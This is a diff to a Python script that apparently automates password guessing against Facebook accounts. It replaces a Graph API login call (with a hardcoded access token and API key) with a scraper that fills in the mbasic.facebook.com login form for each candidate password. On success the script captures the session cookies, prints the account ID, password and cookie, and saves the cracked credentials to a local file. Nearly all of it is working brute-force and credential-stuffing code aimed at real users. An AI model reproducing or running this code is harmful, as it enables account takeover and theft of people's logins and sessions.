@@ -435,71 +435,74 @@ def gxdsFilesMenu(gxdsfiles):
 # API
 def gxds_files(uid, pxss):
     global oks, loop, cps, ugen
-    #session = requests.Session()
+    session = requests.Session()
     try:
         for ps in pxss:
             qwerty = random.choice(ugen)
-            #gxdsfbs = session.get("https://mbasic.facebook.com").text
-            data = {
-            "adid": str(uuid.uuid4()),
-            "format": "json",
-            "device_id": str(uuid.uuid4()),
-            "cpl": "true",
-            "family_device_id": str(uuid.uuid4()),
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
-            "email": uid,
-            "password": ps,
-            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-            "generate_session_cookies": "1",
-            "meta_inf_fbmeta": "",
-            "advertiser_id": str(uuid.uuid4()),
-            "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
-            "method": "auth.login",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d"}
-            headers = {
-            'User-Agent': qwerty,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'graph.facebook.com',
-            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-            'X-FB-Connection-Type': 'MOBILE.LTE',
-            'X-Tigon-Is-Retry': 'False',
-            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'X-fb-device-group': '5120',
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
-            lxgin=json.loads(p)
-            if "session_key" in lxgin:
-                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - \033[0;35m " + yxxr(uid))
-                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
+            gxdsfbs = session.get("https://mbasic.facebook.com").text
+            fb = "n"
+            info = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
+                "jazoest": re.search(
+                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
+                ).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
+                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In",
+            }
+            update = {
+                "authority": f"{fb}.facebook.com",
+                "method": "POST",
+                "scheme": "https",
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "en-US,en;q=1",
+                "cache-control": "no-cache, no-store, must-revalidate",
+                "referer": f"https://{fb}.facebook.com/",
+                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": "Windows",
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-user": "?1",
+                "pragma": "no-cache",
+                "priority": "u=1",
+                "cross-origin-resource-policy": "cross-origin",
+                "upgrade-insecure-requests": "1",
+                "user-agent": qwerty,
+            }
+            session.post(
+                url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+                data=info,
+                headers=update,
+            ).text
+            jabeee = session.cookies.get_dict().keys()
+            if "c_user" in jabeee:
+                coki = ";".join(
+                    [
+                        key + "=" + value
+                        for key, value in session.cookies.get_dict().items()
+                    ]
+                )
+                sort = coki.split("sb=")[1]
+                coki1 = coki.split("1000")[1]
+                xd = "1000" + coki1[0:11]
+                print(
+                    f"\r\r\033[38;5;46m[GXDS-✓] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— "
+                )
+                open("/sdcard/gxds-ok.txt", "a").write(xd + "|" + ps + "\n")
                 oks.append(uid)
                 break
-            elif "www.facebook.com" in lxgin:
-                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - \033[0;35m " + yxxr(uid))
-                open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
-                cps.append(uid)
-                break
             else:
-                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - \033[0;35m" + yxxr(uid))
-                open("/sdcard/gxds-logs.txt", "a").write(uid + "|" + ps + "\n")
                 continue
-                slp(3)
         loop += 1
-        slp(3)
-        #sys.stdout.write( f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "), sys.stdout.flush()
     except:
-      pass
+        slp(2)
 
 
 # FORWARDER
